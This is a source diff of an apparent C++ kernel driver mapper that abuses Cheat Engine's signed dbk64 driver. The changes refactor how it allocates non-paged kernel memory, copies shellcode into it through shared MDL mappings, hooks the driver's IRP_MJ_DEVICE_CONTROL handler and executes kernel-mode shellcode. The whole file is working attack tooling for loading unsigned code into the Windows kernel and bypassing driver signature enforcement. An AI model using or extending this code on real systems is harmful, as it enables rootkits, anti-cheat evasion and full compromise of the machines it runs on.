@@ -1,6 +1,7 @@
 ﻿#include "kdmapper_ce.hpp"
-UINT64 pMmGetSystemRoutineAddress = NULL;
-UINT64 pIofCompleteRequest = NULL;
+
+PVOID64 kdmapper_ce::pMmGetSystemRoutineAddress = NULL;
+PVOID64 kdmapper_ce::pIofCompleteRequest = NULL;
 
 HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {
 
@@ -275,11 +276,10 @@ BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS
 
 }
 
-bool kdmapper_ce::CreateDriverObject(HANDLE hDevice, UINT64 EntryPoint, PCWSTR driverName) {
+BOOL kdmapper_ce::CreateDriverObject(HANDLE hDevice, UINT64 EntryPoint, PCWSTR driverName) {
 
     auto ioCtlCode = IOCTL_CREATE_DRIVER;
     DWORD returned;
-    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);
 
     struct input
     {
@@ -287,8 +287,8 @@ bool kdmapper_ce::CreateDriverObject(HANDLE hDevice, UINT64 EntryPoint, PCWSTR d
         UINT64 DriverInitialize;
         UINT64 driverName;
     } inp = {
-        pMmGetSystemRoutineAddress,
-        EntryPoint,
+        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
+        (UINT64)EntryPoint,
         (UINT64)driverName
     };
 
@@ -304,14 +304,17 @@ PVOID kdmapper_ce::Dbk64HookedDeviceIoControlTest(HANDLE hDevice, PCWSTR functio
     auto ioCtlCode = IOCTL_GETPROCADDRESS;
     DWORD bytesReturned = 0;
     BOOL bRc = FALSE;
-    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);
    
     struct input
     {
         UINT64 MmGetSystemRoutineAddress;
         UINT64 IofCompleteRequest;
         UINT64 functionName;
-    } inp = { pMmGetSystemRoutineAddress, pIofCompleteRequest, (UINT64)functionName };
+    } inp = { 
+        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
+        (UINT64)kdmapper_ce::pIofCompleteRequest, 
+        (UINT64)functionName 
+    };
 
 
     bRc = DeviceIoControl(hDevice,
@@ -330,43 +333,19 @@ PVOID kdmapper_ce::Dbk64HookedDeviceIoControlTest(HANDLE hDevice, PCWSTR functio
         return NULL;
 }
 
-PVOID kdmapper_ce::GetSystemProcAddressAddress(HANDLE hDevice) {
-    /*
-    auto ioCtlCode = IOCTL_GETPROCADDRESS_ADDRESS;
-    DWORD bytesReturned = 0;
-    BOOL bRc = FALSE;
-
-    struct input
-    {
-        UINT64 MmGetSystemRoutineAddress;
-    } inp = { NULL };
-
-    bRc = DeviceIoControl(hDevice,
-        (DWORD)ioCtlCode,
-        &inp,
-        sizeof(input),
-        &inp,
-        sizeof(inp),
-        &bytesReturned,
-        NULL
-    );
-
-    return (PVOID)inp.MmGetSystemRoutineAddress;
-    */
-    return (PVOID)pMmGetSystemRoutineAddress;
-}
-
 PVOID kdmapper_ce::GetSystemProcAddress(HANDLE hDevice, PCWSTR functionName) {
     auto ioCtlCode = IOCTL_GETPROCADDRESS;
     DWORD bytesReturned = 0;
     BOOL bRc = FALSE;
-    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);
 
     struct input
     {
         UINT64 MmGetSystemRoutineAddress;
         UINT64 functionName;
-    } inp = { pMmGetSystemRoutineAddress, (UINT64)functionName };
+    } inp = { 
+        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
+        (UINT64)functionName
+    };
 
     bRc = DeviceIoControl(hDevice,
         (DWORD)ioCtlCode,
@@ -392,113 +371,53 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
     VOID* shellcode = (VOID*)kernel_mode_shellcode_resource::kernel_mode_shellcode;
     SIZE_T shellcodeIoctlSize = sizeof(kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl);
     VOID* shellcodeIoctl = (VOID*)kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl;
+    PVOID64 kernelShellcodeBuf = NULL;
+    KernelPisParameters pisParameters = {};
+    PVOID64 ioctlShellcodeBuf = NULL;
+    PVOID64 kernelParamAddr = NULL;
 
     do {
 
-        pMmGetSystemRoutineAddress = (UINT64)ce_driver::CEGetSystemProcAddress(dbk64_device_handle, L"MmGetSystemRoutineAddress");
-        pIofCompleteRequest = (UINT64)ce_driver::CEGetSystemProcAddress(dbk64_device_handle, L"IofCompleteRequest");
+        kdmapper_ce::pMmGetSystemRoutineAddress = ce_driver::GetSystemProcAddress(dbk64_device_handle, L"MmGetSystemRoutineAddress");
+        kdmapper_ce::pIofCompleteRequest = ce_driver::GetSystemProcAddress(dbk64_device_handle, L"IofCompleteRequest");
 
-        // IRP_MJ_DEVICE_CONTROLのHook
+        if (kdmapper_ce::pMmGetSystemRoutineAddress < (PVOID64)0x7FFFFFFFFFFF || kdmapper_ce::pIofCompleteRequest < (PVOID64)0x7FFFFFFFFFFF)
+            break;
 
-        // IOCTL_ALLOCATEMEM_NONPAGEDで非ページプールにメモリを確保
+        // Place IRP_MJ_DEVICE_CONTROL patch shellcode in kernel space.
 
-        UINT64 kernelShellcodeBuf = ce_driver::AllocateNonPagedMem(dbk64_device_handle, shellcodeSize);
-        if (kernelShellcodeBuf == NULL) {
-            Error("AllocateNoPagedMem failed");
+        kernelShellcodeBuf = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, shellcode, shellcodeSize);
+        if (kernelShellcodeBuf == nullptr) {
+            Error("WriteNonPagedMemory first shellcode failed");
             break;
         }
 
-        Log("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);
+        // Place hooked ioctl shellcode in kernel space
 
-        // 上で確保したバッファのMDL を作成し，ユーザー空間からアクセス可能にする
-
-        UINT64 shellcodeBuf = NULL;
-        UINT64 Mdl = NULL;
-
-        if (!ce_driver::CreateSharedMemory(dbk64_device_handle, kernelShellcodeBuf, &shellcodeBuf, &Mdl, shellcodeSize)) {
-            Error("CreateSharedMemory failed");
+        ioctlShellcodeBuf = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, shellcodeIoctl, shellcodeIoctlSize);
+        if (ioctlShellcodeBuf == nullptr) {
+            Error("WriteNonPagedMemory second shellcode failed");
             break;
         }
 
-        Log("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", shellcodeBuf, Mdl);
+        // Place PIC arguments in kernel space
 
+        pisParameters.MmGetSystemRoutineAddress = kdmapper_ce::pMmGetSystemRoutineAddress;
+        pisParameters.HookFunctionAddress = (LPVOID)ioctlShellcodeBuf;
+        pisParameters.dummy = NULL;
 
-        // 共有メモリにカーネルモードシェルコードを書き込み
-
-        memcpy((void*)shellcodeBuf, shellcode, shellcodeSize);
-
-        // ユーザー空間に割り当てたメモリのアンマップ
-
-        if (!ce_driver::UnMapSharedMemory(dbk64_device_handle, shellcodeBuf, Mdl)) {
-            Error("UnMapSharedMemory failed");
+        kernelParamAddr = kdmapper_ce::WriteNonPagedMemory(dbk64_device_handle, &pisParameters, sizeof(KernelPisParameters));
+        if (kernelParamAddr == nullptr) {
+            Error("WriteNonPagedMemory second shellcode param failed");
             break;
         }
 
-        // シェルコードの引数を準備
-        // Change per PIS
+        // Execute kernel mode shellcode
 
-        UINT64 ioctlShellcodeBuf = ce_driver::AllocateNonPagedMem(dbk64_device_handle, shellcodeIoctlSize);
-        UINT64 ioctlSharedBuf = NULL;
-        UINT64 Mdl1_2 = NULL;
-        if (!ce_driver::CreateSharedMemory(dbk64_device_handle, ioctlShellcodeBuf, &ioctlSharedBuf, &Mdl1_2, shellcodeIoctlSize)) {
-            Error("CreateSharedMemory failed");
-            break;
-        }
-
-        Log("Shared memory for shellcode param has been created in user space at 0x%p (MDL: 0x%p)", ioctlSharedBuf, Mdl1_2);
-
-        memcpy((void*)ioctlSharedBuf, shellcodeIoctl, shellcodeIoctlSize);
-
-        if (!ce_driver::UnMapSharedMemory(dbk64_device_handle, ioctlSharedBuf, Mdl1_2)) {
-            Error("UnMapSharedMemory failed");
-            break;
-        }
-
-        struct KernelPisParameters
-        {
-            LPVOID MmGetSystemRoutineAddress;
-            LPVOID HookFunctionAddress;
-            USHORT dummy2;
-        } pisParameters = {
-            GetSystemProcAddressAddress(dbk64_device_handle),
-            (LPVOID)ioctlShellcodeBuf,
-            NULL
-        };
-
-        UINT64 kernelParamAddr = ce_driver::AllocateNonPagedMem(dbk64_device_handle, sizeof(KernelPisParameters));
-        UINT64 sharedParamBuf = NULL;
-        UINT64 Mdl2 = NULL;
-
-        if (!ce_driver::CreateSharedMemory(dbk64_device_handle, kernelParamAddr, &sharedParamBuf, &Mdl2, sizeof(KernelPisParameters))) {
-            Error("CreateSharedMemory failed");
-            break;
-        }
-
-        Log("Shared memory for shellcode param has been created in user space at 0x%p (MDL: 0x%p)", sharedParamBuf, Mdl2);
-
-        memcpy((void*)sharedParamBuf, (void*)&pisParameters, sizeof(KernelPisParameters));
-
-        if (!ce_driver::UnMapSharedMemory(dbk64_device_handle, sharedParamBuf, Mdl2)) {
-            Error("UnMapSharedMemory failed");
-            break;
-        }
-
-        // カーネルモードシェルコードの実行しパッチを当てる
-
-        UINT64 shellcodeAddress = kernelShellcodeBuf;
-        UINT64 shellcodeParam = kernelParamAddr;
-        if (!ce_driver::ExecuteKernelModeShellCode(dbk64_device_handle, shellcodeAddress, shellcodeParam)) {
+        if (!ce_driver::ExecuteKernelModeShellCode(dbk64_device_handle, (UINT64)kernelShellcodeBuf, (UINT64)kernelParamAddr)) {
             Error("ExecuteKernelModeShellCode failed");
             break;
         }
-
-        // Hooked DeviceIoControlTest
-#ifdef _DEBUG
-        //if (!Dbk64DeviceIoControlTest(dbk64_device_handle)) {
-        //    Error("DeviceIoControlTest failed");
-        //    return FALSE;
-        //}
-#endif // _DEBUG
 
         bRc = TRUE;
 
@@ -507,7 +426,7 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
     return bRc;
 }
 
-bool kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_imports imports) {
+BOOL kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_imports imports) {
     for (const auto& current_import : imports) {
 
         /*ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
@@ -544,4 +463,41 @@ bool kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_import
     }
 
     return true;
+}
+
+PVOID64 kdmapper_ce::WriteNonPagedMemory(HANDLE hDevice, PVOID lpBuffer, SIZE_T nSize) {
+    
+    UINT64 kernelShellcodeBuf = NULL;
+    UINT64 sharedBuf = NULL;
+    UINT64 Mdl = NULL;
+
+    kernelShellcodeBuf = ce_driver::AllocateNonPagedMem(hDevice, nSize);
+    if (kernelShellcodeBuf == NULL) {
+        Error("AllocateNoPagedMem failed");
+        return nullptr;
+    }
+
+    Log("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);
+
+    // Create an MDL for the buffer allocated above and make it accessible from user space.
+
+    if (!ce_driver::CreateSharedMemory(hDevice, kernelShellcodeBuf, &sharedBuf, &Mdl, nSize)) {
+        Error("CreateSharedMemory failed");
+        return nullptr;
+    }
+
+    Log("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", sharedBuf, Mdl);
+
+    // Write shellcode to shared memory
+
+    memcpy((void*)sharedBuf, lpBuffer, nSize);
+
+    // Unmapping of memory allocated to user space
+
+    if (!ce_driver::UnMapSharedMemory(hDevice, sharedBuf, Mdl)) {
+        Error("UnMapSharedMemory failed");
+        return nullptr;
+    }
+
+    return (PVOID64)kernelShellcodeBuf;
 }
